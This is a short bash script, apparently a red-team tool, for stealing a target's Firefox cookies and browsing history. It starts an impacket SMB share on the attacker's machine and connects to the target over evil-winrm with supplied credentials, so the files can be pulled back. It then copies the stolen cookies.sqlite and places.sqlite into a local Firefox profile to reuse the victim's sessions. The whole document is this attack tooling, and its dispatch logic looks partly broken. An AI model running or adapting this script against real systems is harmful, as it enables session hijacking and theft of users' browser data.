```bash
#!/bin/bash
#used to grab files from user's firefox folder and send to attacker's box. super loud as it uses an actual smb connection. don't use if performing red team ops
-evil(){
	impacket-smbserver -smb2support firefox /home/$(whoami)/firefox 2>&1 1>/dev/null && evil-winrm -i $1 -u $2 --scripts=/home/$(whoami)/scripts -l
}

#load cookies/history into firefox test-user profile. if you don't have a test user profile then run firefox-esr -P and make one
-load(){
	cp /home/$(whoami)/firefox/$1-cookies.sqlite* /home/$(whoami)/.mozilla/firefox/*.test-user/cookies.sqlite
		cp /home/$(whoami)/firefox/$1-places.sqlite* /home/$(whoami)/.mozilla/firefox/*.test-user/places.sqlite
}

#open firefox 
-browser(){
	firefox-esr --profile=test-user
}

#kill smb server even if control+C is used to close session
trap(){
	ss -lnpt |grep 445|awk -F= '{print $2}'|awk -F, '{print $1}'|xargs kill 2>&1 1>/dev/null
}

if [[ $1 == "-evil" ]]
	then trap
	exit
fi

```
